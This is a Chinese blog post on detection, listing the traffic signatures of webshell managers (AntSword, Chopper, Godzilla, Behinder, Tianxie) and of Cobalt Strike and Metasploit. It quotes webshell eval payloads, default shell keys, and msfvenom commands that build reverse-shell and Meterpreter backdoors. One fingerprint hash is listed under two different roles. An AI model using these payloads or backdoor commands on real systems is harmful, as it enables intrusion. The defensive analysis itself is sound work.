---
title: "常见webshell工具流量特征"
published: 2026-06-05
updated: 2026-06-05
draft: false
description: "noc=%40eval(%40base64decode(%24POST%5B0x6ce405e4face9%5D))%3B"
image: ""
tags:
  - 流量分析
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

# PHP Webshell 工具

## 蚁剑

### 编码特征
- **加密方式**: PHP Base64 加密
- **默认 User-Agent**: `antsword xxx`
- **编码器**: default 和 rot13 两种

### 强特征
- 请求体中一定有 `@ini_set("display_errors","0");@set_time_limit(0)` 开头
- 明文中会有 `@ini_set()` 函数
- Base64 加密后数据包里大多是 `_0x` 开头
- Base64 数据包中特征: `QGluaV9zZXQ`
- Chr 编码数据包中特征: `cHr(64).ChR(105).ChR(110)...`
- Rot13 编码数据包中特征: `@vav_frg`
- 编码后的数据包中都存在 `eval` 敏感函数

### 编码类型详解

#### Base64 编码
- Payload 进行分段然后用 Base64 加密
- 去掉前两位后是有效数据
- 例: `Y21k` 解密后 == `cmd`
- 例: `Y2QgL2QgIkM6L3BocFN0dWR5L1dXVy9kdi9oYWNrYWJsZS91cGxvYWRzIiZ3aG9hbWkmZWNobyBbU10mY2QmZWNobyBbRV0` 解密后为 `cd /d "C:/phpStudy/WWW/dv/hackable/uploads"&whoami&echo [S]&cd&echo [E]`

#### Chr 类型编码
- 将代码的每一个字符进行 ASCII 编码
- 通过 Chr 函数返回字符
- 然后 eval 执行
- 首部直接告知 eval 关键字

#### Chr16 编码
- Chr 里面是 16 进制编码
- 与 Chr 编码原理相同

#### Rot13 编码
- 对编码后的数据进行 rot13 处理
- 解密后包含 `@vav_frg`（rot13 加密的 `@ini_set`）

### 请求示例
```
noc=%40eval(%40base64_decode(%24_POST%5B_0x6ce405e4face9%5D))%3B
```

---

## 菜刀

### 编码特征
- **加密方式**: Base64 加密
- **代理**: 无代理（使用 wireshark 抓包）
- **默认 User-Agent**: 百度爬虫、火狐 UA 头

### 强特征
- 请求体中有 `eval`、`assert` 这种 Base64 特征字符
- 直接 eval，明文后 base64 加密
- 请求体中存在固定的 Base64 字符串: `QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7`

### 请求特征
```
noc=array_map("ass"."ert",array("ev"."Al(..."QGluaV9zZXQ...")));
```

### 响应特征
- 返回结果在响应包中使用 `X@Y` 作为定界符包裹
- 命令执行结果存在 `[S]` 和 `[E]` 作为定界符

---

## 哥斯拉

### 编码特征
- **编码**: UTF-8
- **加密器**: ASP_EVAL_BASE64

### 强特征
- Cookie 值最后有一个分号: `Cookie: PHPSESSID=iocrpclbbt8mpg4i11j5ocohu0;`
- 响应体中存在一个 `md5前十六位+base64+md5后十六位` 的结构
- 强特征: Webshell 连接失败情况下 2 个流量包，成功为 3 个流量包

### 弱特征
- User-Agent 如果不修改会返回 JDK 信息: `Java/1.8.0_121`
- 默认 Accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`

### 通信流程
1. **第一个请求**: 总会发送大量数据（配置信息），请求包内无 cookie，服务器响应包无内容，生成一个 session
2. **后续请求**: 会带上此 session 到请求包中的 cookie 中
3. **第二个请求**: 发送固定代码用来测试，返回内容为固定字符串，解密后为 OK
4. **第三个请求**: 获取服务器信息等 Webshell 连接成功后的操作

### 请求特征
```
eval(base64_decode(strrev(urldecode('...'))))
```

### 响应数据格式
- 前 16 位: MD5 摘要
- 中间部分: Base64 加密内容
- 后 16 位: MD5 摘要

---

# Java Webshell 工具

## 冰蝎 3.0

### 特征概述
- 内置 16 个 User-Agent
- 取消了动态密钥获取
- 界面由 SWT 改为 JavaFX
- AES 密钥为 `md5("pass")[0:16]`

### 强特征
- 请求包中 `Content-Length` 为 5740 或 5720（可能根据 Java 版本而改变）
- 每个请求头中存在 `Pragma: no-cache` 和 `Cache-Control: no-cache`
- 默认 Accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.9`

### Shell 密钥
在 `shell.jsp` 中的默认密钥示例:
```jsp
String k="e45e329feb5d925b";
```
其中 `e45e329feb5d925b` 为 `rebeyond`（默认连接密码的 MD5 值前 16 位）

---

## 冰蝎 4.0

### 特征概述
- TCP 连接端口在 49700 左右，每次连接逐一叠加
- 内置 10 个 User-Agent，每次连接 shell 都会换一个
- 默认连接密码为 `rebeyond`，密钥是 MD5 值的前 16 位
- 有固定的请求头和响应头

### 强特征
- Accept: `application/json, text/javascript, */*; q=0.01`
- 浏览器可接受任何文件，但最倾向 `application/json` 和 `text/javascript`
- 弱特征: `Content-Type: Application/x-www-form-urlencoded`

### 长连接特征
- 冰蝎通讯默认使用长连接，避免频繁握手
- 请求头和响应头里会带有 `Connection: Keep-Alive`
- 请求中 `Content-Length` 为 5740 或 5720

### 版本更新
- 部分 3.0 以后的子版本至 4.0 以后增加了 Referer 参数
- 末尾文件名随机大小写

---

## 天蝎

### 特征
1. **X-Forwarded-For**: 空或伪造 IP
2. **User-Agent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57`
3. **Content-Type**: `application/octet-stream`

---

# 其他工具流量分析

## Cobalt Strike (CS)

### HTTP 心跳包特征
- 流量中 HTTP 协议数据包（心跳包）访问路径通过 checksum8 算法计算
- 92 为 32 位、93 为 64 位则符合 CS 未魔改的流量特征
- 老版本 CS 的 UA 头是固定的，现在都随机了

### 命令下发特征
- 下发指令时会抓到 `POST /submit.php/?id=xxxxx`
- 即使魔改也不影响：会出现 `POST /submit.php/?id=xxxxx` 或 `POST /q.cgi`

### 心跳包分析
- 可用脚本对 CS 心跳包进行解密
- 心跳包后缀为 `.vir` 文件

### HTTPS 流量特征

#### 证书特征
- 老证书带有 CS 特征

#### JA3 指纹特征
- **ClientHello JA3**: `e1742a87329fe9f88dfc5d9a4261e766`
- **ServerHello JA3S**: `15af977ce25de452b96affa2addb1036`
- JA3 和 JA3S 值会随着操作系统变化，同一个操作系统的内容固定

---

## Metasploit Framework (MSF)

### Meterpreter 模块特征

#### 文件特征
- 基于 meterpreter 模块下生成的后门加密文件
- 文件头一致: `MZ` 开头（PE 格式）
- 结尾为 Dos 模式
- 32 位和 64 位的文件头部不同

#### HTTP 协议特征
```
GET /xxx(不固定) HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0
Host: 47.94.236.117:6670
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: Keep-Alive
Server: Apache
Content-Length: 176220(不固定)
```

**特征**:
- 固定的 UA 头前缀: `Mozilla/5.0 (`
- Connection 和 Cache-Control 一致
- Request 和 Response 返回的数据包格式一致

#### HTTPS 协议特征
- 出现 Client Hello 和 Server Hello
- 包含 JA3 和 JA3S 的特征值，根据操作系统变化
- 与 CS 类似的 TLS 指纹

### 生成方式示例

#### Shell 模式（明文传输）
```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=xx lport=6666 -f exe -o 6666.exe
```
特征: 从数据包明文中判断命令执行

#### Meterpreter HTTP 模式
```bash
msfvenom -p windows/meterpreter/reverse_http lhost=xx lport=6667 -f exe -o 6667.exe
msfvenom -p windows/meterpreter/reverse_http lhost=192.168.174.150 lport=7777 -f exe -o 7777.exe
```

#### Meterpreter HTTPS 模式
```bash
msfvenom -p windows/meterpreter_reverse_https lhost=xx lport=6669 -f exe -o 6669.exe
```

### 常见 JA3/JA3S 值
| 类型 | 值 | 说明 |
|------|-----|------|
| JA3 | `4d93395b1c1b9ad28122fb4d09f28c5e` | ClientHello 指纹 |
| JA3S | `652358a663590cfc624787f06b82d9ae` | ServerHello 指纹 |
| JA3 | `15af977ce25de452b96affa2addb1036` | 另一种 ClientHello 指纹 |
| JA3S | `2253c82f03b621c5144709b393fde2c9` | 另一种 ServerHello 指纹 |

---
